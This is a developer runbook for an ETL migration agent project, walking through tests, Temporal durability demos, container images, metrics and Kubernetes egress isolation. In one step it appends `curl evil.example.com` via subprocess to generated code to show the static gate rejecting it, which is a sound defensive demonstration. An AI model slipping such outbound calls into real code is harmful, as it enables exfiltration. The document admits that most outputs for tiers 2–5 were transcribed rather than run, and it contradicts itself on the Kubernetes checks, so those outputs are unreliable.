# Runbook

How to run this project on a laptop and see each claim in the README actually
happen, including the Temporal durability behaviour, which is the part that
cannot be demonstrated by reading code.

The sections are ordered by what they cost you. Tier 0 needs nothing but
Python. Tier 5 needs a Kubernetes cluster. **You can stop at any tier** and
everything below it still stands on its own.

| Tier | Needs | Time | What you get to see |
|---|---|---|---|
| 0 | Python 3.11/3.12 | 2 min | Deterministic analysis, the static gate, 587 tests |
| 1 | + a JVM | 15 min | Both pipelines executed, outputs diffed, a repair, a measured speedup |
| 2 | + Docker | 20 min | **Temporal: durability, signals, queries, child workflows** |
| 3 | + Docker | 10 min | The two container images, non-root, built as CI builds them |
| 4 | + Docker | 5 min | Prometheus scraping a live worker, Grafana dashboard |
| 5 | + kind/kubectl | 20 min | Trust-split workers, default-deny egress |

---

## On Windows: use WSL2, not Git Bash

Not a style preference. Tier 1 and up genuinely cannot run on native Windows,
and the reason is in this repository rather than in your setup.

The sandbox that executes generated code is POSIX-only **by design**. It is the
mechanism that makes "do not execute untrusted generated code on the host" true,
and every part of it is a Unix primitive:

| Where | What it uses |
|---|---|
| `sandbox/_bootstrap.py:18` | `import resource`, rlimits for CPU, address space, file size, open files, process count |
| `sandbox/runner.py:218` | `start_new_session=True`, the child gets its own process group |
| `sandbox/runner.py:286` | `os.killpg(os.getpgid(pid), SIGKILL)`, Spark forks executors, so killing only the parent leaves them holding the output directory |

`resource` does not exist on Windows; `SIGKILL`, `killpg` and `getpgid` do not
either. On native Windows the sandbox child dies with `ModuleNotFoundError: No
module named 'resource'`, and *everything* that executes a pipeline goes through
that sandbox: validation, benchmarking, the generated pytest suite. PySpark on
Windows separately wants `winutils.exe` and `hadoop.dll` on a `HADOOP_HOME`,
which is its own afternoon.

### Setup

Three different shells appear below and they are not interchangeable. Check
your prompt before pasting anything. `apt` in Git Bash gives you
`Command not found`, which looks like a broken install and is not one:

| Prompt looks like | That is | Package manager |
|---|---|---|
| `PS C:\Users\you>` | PowerShell | `winget` |
| `you@HOST MINGW64 ~/...` | **Git Bash, still Windows** | none |
| `you@HOST:~$` | **Ubuntu, inside WSL** | `apt` |

**1. Install WSL**: in PowerShell, as Administrator:

```powershell
wsl --install -d Ubuntu
```

Reboot if asked. First launch prompts for a new UNIX username and password,
unrelated to your Windows login; you need that password for `sudo`. Already
installed? `wsl --list --verbose` shows what you have.

**2. Open Ubuntu**: Start menu → Ubuntu, or type `wsl` in PowerShell. The
prompt must read `you@HOST:~$` with no `MINGW64` before you continue.

**3. Install the dependencies**: now `apt` exists:

```bash
sudo apt update
sudo apt install -y python3-venv openjdk-21-jdk make git
python3 --version          # must be 3.11 or 3.12
```

**4. Clone inside Ubuntu**, in the Linux home directory:

```bash
cd ~
git clone https://github.com/1mad-elmakaoui/autonomous-etl
cd autonomous-etl
```

From here the rest of this runbook applies unchanged. It is Linux.

Two things that will bite you otherwise:

- **Clone into `~/`, not `/mnt/c/...`.** An existing Windows checkout is
  reachable from WSL, but Windows drives are mounted over 9p, and Spark's file
  I/O across that mount is slow enough to distort the tier-1 benchmarks, which
  makes the one number this project exists to measure untrustworthy. A wrong
  number that looks like a result is worse than a crash.
- **Docker Desktop needs *Settings → Resources → WSL integration* enabled** for
  your Ubuntu distro. Then `docker` and `docker compose` work inside WSL and
  tiers 2–5 are ordinary.

`wsl --install` needs Windows 10 build 2004 or later, or Windows 11, with
hardware virtualization enabled in BIOS/UEFI.

### What still works in Git Bash, if you want it

The read-only half of tier 0. No subprocess, no JVM:

```bash
py -3.12 -m venv .venv
source .venv/Scripts/activate        # Scripts, not bin, on Windows
pip install -e ".[dev]"

etl-migrator inspect examples/customer_pipeline/legacy_pipeline.py
etl-migrator profile examples/customer_pipeline/input
etl-migrator patterns
etl-migrator gate "$MIG/legacy_pipeline_spark.py"
```

`make` is not shipped with Git Bash, so run the underlying commands from the
`Makefile` directly. Expect `tests/test_sandbox.py` to fail rather than skip;
it is asserting on Unix isolation that is not there.

---

## Tier 0: no JVM, no Docker

### Setup

```bash
git clone https://github.com/1mad-elmakaoui/autonomous-etl
cd autonomous-etl
git checkout claude/autonomous-etl-migration-agent-29al8n

python3.12 -m venv .venv && source .venv/bin/activate   # 3.11 or 3.12
pip install -e ".[dev,spark]"
```

> **Install the `spark` extra even if you have no JVM yet.** `make install`
> installs `.[dev]` only, and the 55 Spark equivalence tests then
> `importorskip` themselves. They skip *cleanly and silently*, so a run that
> exercised none of the interesting behaviour still prints all-green. There is a
> `make install-spark` target that gets both extras.

No API key is needed anywhere in this runbook. `ETLM_LLM_PROVIDER` defaults to
`scripted`, which replays recorded responses from `fixtures/llm/` through the
same `ChatCompletionClient` interface a real provider implements. Nothing in
tiers 0–5 makes a paid API call.

### 1. The deterministic layer, with no LLM involved at all

This is the foundation the whole design rests on: the agents never parse code
themselves, they are *handed* facts extracted by an AST walker.

```bash
etl-migrator inspect examples/customer_pipeline/legacy_pipeline.py
```

```
language: python_pandas
imports: os, pandas, sys
functions: run   entrypoint_run_defined: True
dataframe variables: customers, orders, result
referenced column literals: age, country, customer_id, price, quantity, revenue

READS:
  L31: customers = pd.read_csv(os.path.join(input_dir, 'customers.csv'))
  L32: orders = pd.read_csv(os.path.join(input_dir, 'orders.csv'))
...
DATAFRAME OPERATIONS:
  L38: [join] customers.merge(orders, on='customer_id', how='left') -> result
  L40: [aggregate] result.groupby('country')['revenue'].sum() -> result  chained: .reset_index
```

Every line there is measured from the syntax tree. Delete a line from
`legacy_pipeline.py` and re-run. The output changes because it is derived, not
described.

Two more views of real system state, still with no model in the loop:

```bash
etl-migrator profile examples/customer_pipeline/input      # dtypes, nulls, cardinality, broadcast eligibility
etl-migrator patterns                                      # the structured catalogue the planner queries
```

### 2. Generation without execution

```bash
make demo-fast     # etl-migrator migrate ... --no-validate
```

Discovery → planning → approval policy → PySpark generation → static gate. It
writes a directory per migration under `.workspace/`, named for the migration
id. Every command below refers to the most recent one, so set this once:

```bash
MIG=$(ls -td .workspace/*/ | head -1)     # newest migration directory
echo "$MIG"                               # .workspace/mig-20260813T155252-24a9eb4a/
```

Open `"$MIG/legacy_pipeline_spark.py"` and read what came out.

### 3. The gate, and proving it is not decorative

```bash
etl-migrator gate "$MIG/legacy_pipeline_spark.py"
```

```
static analysis: clean

gate: PASS
```

Now make it fail on purpose. Append this to the generated file and re-run:

```bash
echo 'import subprocess; subprocess.run(["curl", "evil.example.com"])' \
  >> "$MIG/legacy_pipeline_spark.py"
etl-migrator gate "$MIG/legacy_pipeline_spark.py"
```

```
[ERROR] GATE002 (line 95): import of 'subprocess' is not permitted. Allowed roots: __future__,
        collections, dataclasses, datetime, decimal, enum, functools, itertools, math, pyspark, typing
[ERROR] GATE011 (line 95): module-level statement 'Expr' executes on import. All work must live
        inside run(spark, input_dir, output_dir).

gate: FAIL
```

Two independent rules catch it and the command exits 1. Generated code is
treated as untrusted input, not as output from a trusted collaborator. Re-run
`make demo-fast` to get a clean file back.

### 4. The test suite

```bash
make test-fast     # everything except the Spark tier
```

587 tests, no JVM, no network. Includes the CI-policy tests, the Kubernetes
manifest tests, the metric-registry tests, and the learning-loop tests.

---

## Tier 1: add a JVM

Install a JDK 17 or later (Spark 4 requires it; this project is developed
against 21).

```bash
# macOS
brew install openjdk@21
sudo ln -sfn $(brew --prefix)/opt/openjdk@21/libexec/openjdk.jdk \
             /Library/Java/JavaVirtualMachines/openjdk-21.jdk

# Debian/Ubuntu
sudo apt-get install -y openjdk-21-jdk

java -version   # confirm before continuing
```

### 5. A full migration, to a *measured* verdict

```bash
make demo
```

This is the core claim of the project. It runs the legacy pandas pipeline, runs
the generated PySpark pipeline, and diffs the two outputs, schema, row count,
row-by-row values with float tolerance, null placement, ordering. The verdict is
PASS or FAIL because of a comparison that happened, not because a model said so.

Afterwards, look at what it wrote:

```bash
MIG=$(ls -td .workspace/*/ | head -1)     # re-resolve: `make demo` made a new one
ls "$MIG"
#   migration_spec.json     what discovery extracted
#   migration_plan.json     the plan, with per-risk-category reasoning
#   legacy_pipeline_spark.py
#   static_analysis.json    the gate verdict
#   reference_output/       what pandas produced
#   candidate_output/       what Spark produced
#   agent_trace.json        every agent call: input, reasoning, decision, tool calls
#   migration_record.json   the durable record everything else derives from
```

`agent_trace.json` is worth reading closely. It is the audit trail for
"Input → Reasoning → Structured Decision → Tool Invocation → Observable Result".

### 6. Watch the repair loop fix a genuinely broken pipeline

```bash
make demo-repair
```

The `customer_pipeline_broken` scenario generates PySpark that passes the static
gate and is still *wrong*. It disagrees with pandas on null-key grouping and on
index semantics. Watch the loop: diff detects the disagreement, the diagnosis
agent is given the actual differing rows, a repair strategy is proposed, and the
result is re-validated. One of the three attempts is refused by the
anti-oscillation ledger for repeating a strategy already tried.

Success here means byte-identical output, not "the agent believes it fixed it".

### 7. Watch an optimisation get accepted on measurement, and see the null case

```bash
make demo-optimize
```

Baseline benchmark → optimisation proposed → candidate benchmark → compare. The
speedup must clear `--min-speedup` (default 1.1) *and* be robust against the
measured noise, and correctness must still hold. A proposal that looks fast and
does not measure is refused.

The honesty check for this harness is in the test suite:

```bash
pytest tests/test_optimization_e2e.py -v -k null
```

That is a null experiment: it benchmarks a pipeline against *itself*. If the
harness were biased toward finding improvements, this would report one. It does
not.

### 8. The full suite

```bash
make test
```

Expect **649 tests, exit 0**, with 55 Spark equivalence tests genuinely executed
against your JVM and 9 skipped: 7 integration tests (tier 2 below) and 2
kubeconform schema tests (tier 5). If you see ~64 skips instead of 9, the
`spark` extra is not installed, see the note in Tier 0.

---

## Tier 2: Temporal

This is the tier that shows the things you cannot see any other way. A workflow
engine's value is entirely in what happens when something goes wrong, so most of
this section is about breaking things on purpose.

### 9. Start the stack

```bash
make temporal-up          # docker compose up -d
```

Three containers: Postgres 16, `temporalio/auto-setup:1.29.0`, and the UI.

Open **http://localhost:8080**, the Temporal Web UI. Leave it open; everything
below shows up there.

### 10. Start a worker

In a second terminal:

```bash
source .venv/bin/activate
make worker               # etl-migrator worker
```

The worker registers `ETLMigrationWorkflow` plus its four child workflows and
all activities on the `etl-migration` task queue, and starts a Prometheus
endpoint on `:9464`.

### 11. Submit a migration, and hit the human-approval gate

Third terminal. Pin the id yourself with `--migration-id` so every command
below is copy-pasteable, the migration id *is* the Temporal workflow id, and
choosing it is legal precisely because submission is idempotent (step 14):

```bash
source .venv/bin/activate
etl-migrator submit examples/customer_pipeline/legacy_pipeline.py --migration-id demo-1
```

```
submitted demo-1
  run id : 01924f...
  status : etl-migrator status demo-1
  approve: etl-migrator approve demo-1 --actor you
```

(`make submit` does the same thing with a generated timestamp id; it prints the
id it chose, and you would substitute that below.)

The example plan comes out **HIGH risk**, so it stops at the approval gate:

```bash
etl-migrator status demo-1
#   awaiting approval: True
#   waiting for: etl-migrator approve demo-1 --actor you
```

Two things worth noticing:

- **`status` is a Temporal query, not a database read.** There is no status
  table anywhere in this project. The live workflow answers for itself.
- **The gate is policy, not preference.** `lifecycle.requires_approval` is
  evaluated by the orchestrator. A planner that sets
  `requires_human_approval=False` on a HIGH-risk plan is overruled, letting the
  model answer "may I skip review?" would make the gate decorative. See
  `src/etl_migrator/domain/lifecycle.py:87`.

### 12. **The durability demo, do this one**

While the migration is paused at the gate, **kill the worker**:

```bash
# in the worker terminal
Ctrl-C
```

Now approve it anyway, with no worker running at all:

```bash
etl-migrator approve demo-1 --actor you --reason "checked the plan"
```

The signal is accepted. Temporal has it durably; there is simply nobody to act
on it. Confirm in the UI that the workflow is still there, still open.

Now bring the worker back:

```bash
make worker
```

It picks up exactly where it left off and continues past the gate. Nothing was
re-run, nothing was lost, and no state lived in the worker's memory. That is the
entire reason Temporal is in this project rather than a `while` loop and a
status column.

Variations worth trying:

```bash
# Kill the worker mid-execution instead of mid-pause, same result.
# Docker-stop Postgres for 30s and restart it, the workflow survives.
etl-migrator abort demo-1 --reason "changed my mind"   # recorded distinctly from a failure
etl-migrator approve demo-1 --actor you --reject       # stops before codegen
```

### 13. What to look at in the Temporal UI

Click into the workflow and open the **event history**. Things to find:

- **`ETLMigrationWorkflow`** as the parent, with **`ValidationWorkflow`**,
  **`RepairWorkflow`**, **`OptimizationWorkflow`** and **`DeliveryWorkflow`** as
  child workflow executions. Each is a separate execution with its own history, so
  a repair loop that runs three attempts does not bloat the parent's history.
- **`WorkflowExecutionSignaled`** for your approval, sitting in the history
  *before* the worker came back. That event is the durability claim, written
  down.
- **Activity retries**, each activity carries a `RetryPolicy`; a transient
  failure shows as repeated `ActivityTaskScheduled`/`ActivityTaskFailed` pairs
  without the workflow restarting.
- **Queries**, the Query tab lets you call `status` and `report` by hand. Same
  entry points the CLI uses.

### 14. Idempotent submission

```bash
etl-migrator submit examples/customer_pipeline/legacy_pipeline.py --migration-id fixed-id
etl-migrator submit examples/customer_pipeline/legacy_pipeline.py --migration-id fixed-id
```

The second attaches to the running execution rather than starting a second one.
The migration id *is* the workflow id.

### 15. The trust split (which tier 5 makes load-bearing)

```bash
export ETLM_TEMPORAL_EXECUTION_TASK_QUEUE=etl-migration-exec

etl-migrator worker --role agent        # LLM + GitHub activities
etl-migrator worker --role execution    # only the activities that run generated code
```

Two queues, two workers. The execution worker never constructs a model client
and holds no credentials, which is what makes "no internet egress at all" a
deployable statement rather than a wish. In Kubernetes it becomes a
default-deny NetworkPolicy (tier 5). On one queue (`--role all`, the default)
this is invisible, which is exactly why it is enforced by a test rather than by
convention.

### 16. The Temporal integration tests

With the stack up:

```bash
make test-integration     # pytest -m integration
```

7 tests that cannot be faked into passing: the approval pause, a rejection
stopping the run before codegen, an abort mid-flight, artifacts written even on
rejection, idempotent resubmission, the `report` query returning the durable
record, and the interesting one,
`test_completed_history_replays_without_divergence`, which replays a finished
workflow's history and fails if the workflow code has become non-deterministic.

These skip (with the `docker compose up -d temporal` command in the skip reason)
when no server answers, rather than being stubbed to keep CI green.

---

## Tier 3: the container images

```bash
make docker-smoke     # builds both images, then proves they start
```

Builds `cli` and `worker` targets exactly as CI does, runs `--help` in one and
`java -version` in the other, and **fails the target if either runs as uid 0**.

```bash
docker run --rm etl-migrator:cli --help
docker run --rm --entrypoint id etl-migrator:worker -u     # 10001, not 0
```

---

## Tier 4: Prometheus and Grafana

```bash
make observability-up
```

- Prometheus: http://localhost:9090
- Grafana: http://localhost:3000 (dashboard provisioned, anonymous viewer, no login)

There are four links in the chain and each is worth checking separately,
because a blank dashboard looks identical whichever one is broken.

### 1. The worker is exposing metrics

The exporter starts with the worker, on `metrics_port` (9464 by default). Note
the prefix is `etl_`, not `etlm_`:

```bash
etl-migrator worker &                                # if one is not already running
curl -s localhost:9464/metrics | grep '^etl_' | head
```

A worker that has completed no migrations exposes only a handful of samples,
and that is correct rather than broken: a labelled counter has no series until
something is counted. All sixteen metric *families* are registered from the start, which the
exposition renders as 19 `# HELP` lines, the three extras are the `_created`
companions of the counters that carry no labels and so materialise immediately:

```bash
curl -s localhost:9464/metrics | grep -c '^# HELP etl_'      # 19
```

### 2. Prometheus can reach it

**http://localhost:9090/targets**

Two targets are configured. Expect exactly one to be UP:

| Target | State | Why |
|---|---|---|
| `host.docker.internal:9464` | UP | the worker from your checkout, the normal development shape |
| `worker:9464` | DOWN | the containerised worker, only present under `--profile worker` |

A permanently-DOWN target is deliberate, not an oversight. Whether a worker is
running is itself a fact worth graphing, and the `up` series is the honest way
to see it, a config that listed only the target that happens to exist would
make "no worker" indistinguishable from "no data".

If `host.docker.internal` is DOWN while step 1 works, that is a networking
problem between the container and your host, not a metrics problem. It relies
on the `extra_hosts: host-gateway` mapping in `docker-compose.yml`.

### 3. Data is arriving

Run a migration (`make demo`, or a Temporal `submit`), then in Prometheus:

```promql
etl_migrations                        # by outcome
etl_validations                       # by status
etl_stage_duration_seconds_count      # per stage
etl_optimization_attempts             # by verdict, the interesting one
```

`etl_optimization_attempts` carries a `verdict` label with eight values:
`accepted`, `declined`, `refused_repeat`, and five `rejected_*` reasons. A run
where the optimiser proposed nothing records `declined`; `make demo-optimize`
produces an `accepted`. (Do not confuse the verdict with the *approach* slug:
a summary line reading `attempt 1 [no_change]` names the approach; the verdict
beside it is what the metric records.) Those labels come from structured fields on the attempt, never from
anything the model wrote in prose.

### 4. Grafana renders it

**http://localhost:3000**, the dashboard is provisioned, so it is already
there; no login, no import step. Twelve panels. If steps 1–3 pass and Grafana is
still empty, the datasource provisioning is the only thing left.

### What makes these numbers trustworthy

They are computed from the finished `MigrationRecord`, the same object the PR
body renders from, so a dashboard and a pull request cannot disagree. Only
*accepted* speedups reach `etl_optimization_speedup_ratio`, so the histogram
cannot be padded with proposals that were refused.

The offline half is checked without any of this running:

```bash
pytest tests/test_metrics.py -q
```

which reads metrics back out of the exposition format, holds label cardinality
to a bound, and asserts every query in the Grafana JSON names a metric the code
actually exports, the check that keeps a dashboard from quietly graphing a
metric that no longer exists.

---

## Tier 5: Kubernetes

**None of the three tools are in Ubuntu's apt**, `apt install kind kubectl
kubeconform` fails on all three. They are upstream binaries, installed by
download:

```bash
# kubeconform, the only one `make k8s-validate` needs
curl -fsSLO https://github.com/yannh/kubeconform/releases/download/v0.7.0/kubeconform-linux-amd64.tar.gz
echo "c31518ddd122663b3f3aa874cfe8178cb0988de944f29c74a0b9260920d115d3  kubeconform-linux-amd64.tar.gz" | sha256sum -c -
tar xzf kubeconform-linux-amd64.tar.gz && sudo install -m 0755 kubeconform /usr/local/bin/

# kubectl, resolves the current stable release itself
curl -fsSLO "https://dl.k8s.io/release/$(curl -fsSL https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
sudo install -m 0755 kubectl /usr/local/bin/

# kind, needs a Docker daemon, which Docker Desktop's WSL integration provides
curl -fsSLo kind https://kind.sigs.k8s.io/dl/latest/kind-linux-amd64
sudo install -m 0755 kind /usr/local/bin/
```

The version and checksum for kubeconform are the ones CI pins; a tag is mutable
and a sha256 is not, which is why the download is verified rather than trusted.
On macOS all three are `brew install kind kubectl kubeconform`.

### Start here, no cluster required

```bash
make k8s-validate
```

Strict schema validation of every manifest against the published Kubernetes
JSON schemas, plus the policy checks the isolation rests on: roles split, no
credentials on the executing worker, default-deny egress, no API token mounted.
61 tests, a few seconds, and where most of the value in this tier is.

Worth also rendering what would actually be applied, since kustomize's
transformations can differ from the files on disk:

```bash
kubectl kustomize k8s/base | kubeconform -strict -summary -ignore-missing-schemas -
# Summary: 16 resources found parsing stdin - Valid: 15, Invalid: 0, Errors: 0, Skipped: 1
```

The one skip is the `ServiceMonitor`, whose schema lives in the Prometheus
Operator's CRD rather than the Kubernetes API. `tests/test_kubernetes.py` keeps
an allowlist of custom resources so that skip cannot quietly absorb a typo'd
`apiVersion`.

### A real cluster

**`kind create cluster` alone is not enough**, and the two extra steps are not
optional:

- `k8s/kind/cluster.yaml` sets `disableDefaultCNI: true`, because kind's own CNI
  does not enforce NetworkPolicy. Until Calico is installed, no pod schedules at
  all, not even CoreDNS.
- The manifests name `ghcr.io/1mad-elmakaoui/autonomous-etl`, which nothing
  has ever published, so the images must be built and loaded into the cluster by
  hand.

The full sequence, Calico, images, Temporal via Helm, then this directory, is
in **[`k8s/README.md`](../k8s/README.md)**. Follow that rather than improvising;
it is about 20 minutes, most of it waiting for Temporal's chart to settle.

Once it is up, the demonstration worth doing is the network isolation, because
it is the one claim the manifests cannot make on their own:

Run it against the real pods, and **run both halves**, the second is a control,
not a flourish:

```bash
# The executing worker must not reach the internet. A timeout is the pass.
kubectl -n etl-migration exec deploy/etl-execution-worker -- \
  python -c "import socket; socket.create_connection(('1.1.1.1', 443), timeout=5)"
# TimeoutError: timed out

# The agent worker must. It calls a model provider and the GitHub API.
kubectl -n etl-migration exec deploy/etl-agent-worker -- \
  python -c "import socket; socket.create_connection(('1.1.1.1', 443), timeout=5); print('reachable')"
# reachable
```

A timeout from the executing worker on its own proves nothing. It is equally
consistent with the policy being enforced and with the cluster having no
outbound connectivity at all, and from inside that pod the two are
indistinguishable. Only a pod that *can* get out tells them apart. This is the
same discipline as the optimiser's null experiment, which benchmarks a pipeline
against itself: a check that would pass anyway is not a check.

Both were run on kind + Calico and produced exactly the output above; see
`k8s/README.md` for the conditions.

`make k8s-validate` is worth running even with no cluster: it schema-validates
every manifest against the published Kubernetes JSON schemas and then checks the
premises the isolation rests on, roles split, no credentials on the executing
worker, default-deny egress, no API token mounted.

`k8s/README.md` states plainly which properties are verified by the tests and
which require a live cluster with a CNI that enforces NetworkPolicy.

---

## The learning loop

After several migrations have completed:

```bash
etl-migrator history
```

```
  migrations: 1 (1 validated)

  Too few migrations for any of this to be evidence. Treat it as anecdote.

  optimisation approaches
    enable_adaptive_coalescing: 1/1 — not enough evidence to report a rate (needs 3 attempts)
```

That refusal is the feature. Below three observations there is no rate, because
a confidence that rises the moment anything is observed looks like knowledge and
an agent will act on it. Run `make demo` a few more times and watch rates appear
once the evidence supports them.

There is no vector store and no embedding here. A lookup is a dictionary access
on a typed key, `(RiskCategory, approach)`, which is exactly the vocabulary the
agents already emit.

---

## Running against a real LLM

Everything above uses recorded fixtures. To use a live model:

```bash
cp .env.example .env
# ETLM_LLM_PROVIDER=anthropic
# ETLM_LLM_MODEL=claude-sonnet-4-5
# ETLM_LLM_API_KEY=sk-ant-...
```

`.env` is gitignored and no secret appears anywhere in source. The provider is
behind an interface, so nothing else changes, which is the point of having
built against the interface rather than against one vendor's SDK.

## Opening a real pull request

```bash
export ETLM_GITHUB_TOKEN=ghp_...
export ETLM_GITHUB_REPOSITORY=you/some-test-repo
make demo-pr
```

Without those two variables the delivery stage reports that it was **skipped**
rather than failing the migration. Every write is lookup-then-create, so
re-running does not create duplicate branches or pull requests.

Before it writes anything, the delivery stage audits its own PR body: every
numeric claim in the narrative (`3.2x`, `12 tests`, `2 differences`) is checked
against the record, and an unsupported number blocks delivery. An agent that
writes a PR description is an agent that can overstate its results in the one
artifact a human is most likely to read instead of the evidence.

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| ~64 tests skipped, not 9 | `spark` extra missing | `pip install -e ".[dev,spark]"` |
| `JAVA_HOME is not set` / Spark won't start | No JDK, or 11 | Install JDK 17+ (21 recommended) |
| `failed to connect to Temporal` | Stack not up, or still initialising | `make temporal-up`, then wait, `auto-setup` takes ~30s on first boot to create schemas |
| Workflow stuck, no activity in the UI | No worker running, or wrong queue | Start `make worker`; check `ETLM_TEMPORAL_TASK_QUEUE` matches |
| Grafana panels empty | Nothing scraped yet | Worker must be running; check `localhost:9090/targets` |
| 2 kubeconform tests skipped | Binary not installed | see Tier 5; it is a download, not an apt package (optional) |
| Port 5432/7233/8080/9090/3000 in use | Something else is bound | `make temporal-down`, or edit the ports in `docker-compose.yml` |

Reset everything:

```bash
make temporal-down
make observability-down
make clean            # removes .workspace and all caches
```

---

## What this runbook does not prove

Stated plainly, because a runbook that oversells is worse than none:

- **Tiers 2–5 were written from the manifests and compose file, not executed
  here.** The development environment for this branch has no Docker daemon, no
  Actions runner and no Kubernetes cluster. Tiers 0 and 1 were run and their
  output above is real; the Temporal, Docker, Grafana and Kubernetes commands are
  transcribed from configuration that has been schema-validated and policy-tested
  but not stood up end to end.
- **NetworkPolicy enforcement depends on your CNI.** The manifests declare
  default-deny egress; whether it is *enforced* is a property of the cluster.
  kind's default CNI does not enforce NetworkPolicy, use Calico or Cilium if you
  want to verify that claim rather than read it.
- **The release workflow publishes images but does not deploy.** There is no
  deploy step, deliberately. One that pretended to would turn a missing
  capability into a green tick.
- **Only the pandas legacy inspector exists.** `SourceLanguage` and its dispatch
  are real; SQL and shell sources are rejected rather than half-parsed.
